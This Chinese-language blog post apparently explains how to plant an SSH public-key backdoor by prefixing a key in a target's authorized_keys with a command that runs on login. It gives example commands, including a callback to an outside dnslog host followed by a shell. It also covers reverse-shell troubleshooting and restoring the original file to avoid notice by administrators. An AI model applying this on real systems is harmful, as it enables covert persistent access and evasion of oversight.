ssh公钥后门利用

发表于 2023-10-15

利用条件

开启了sshd服务且支持公钥连接（文件为/etc/ssh/sshd_config）

攻击机生成key

默认生成的key在/home/当前用户/.ssh目录下

靶机利用

添加命令touch /tmp/1.txt到生成的公钥文件id_rsa.pub，将所有内容写入到靶机用户的authorized_keys文件中

攻击机连接靶机即可触发命令

问题

1.命令执行后执行断开了连接？

我对这个公钥后门的理解是拿着公钥去执行command的内容，执行完了当然就断开连接了，那么可以换个思路，当执行完恶意命令后再执行一个bash命令，返回给登录用户一个shell，是不是就可以了呢？比如command设置为command="ping -c 1 fa.cye9n0.dnslog.cn && /bin/bash"

2.反弹shell提示找不到文件？

操作系统版本问题，可以尝试加一个bash -c 将命令编写为command="bash -c 'touch /tmp/1.sh'"的形式

3.触发反弹shell时 ssh 登录会卡住?

这个问题和1类似，因为执行的是反弹shell操作，所以在你的shell结束前会一直等待登录，其中如果ssh登录断掉shell也会断掉，反之亦然

常规利用

由于反弹shell会卡住登录，可能会引起管理员的注意，所以这个点可以只用来执行命令。实战环境记得先备份原文件！命令执行完后加一个还原覆盖操作，将原文件内容从新写入，复制、echo都可以，我这里用的echo

触发后会还原原文件，一般这种操作用于结合其他利用，比如后门安装、计划任务啥的（ps：略显鸡肋，权限高其实可以直接写计划任务啥的，这一步似乎没太大必要）
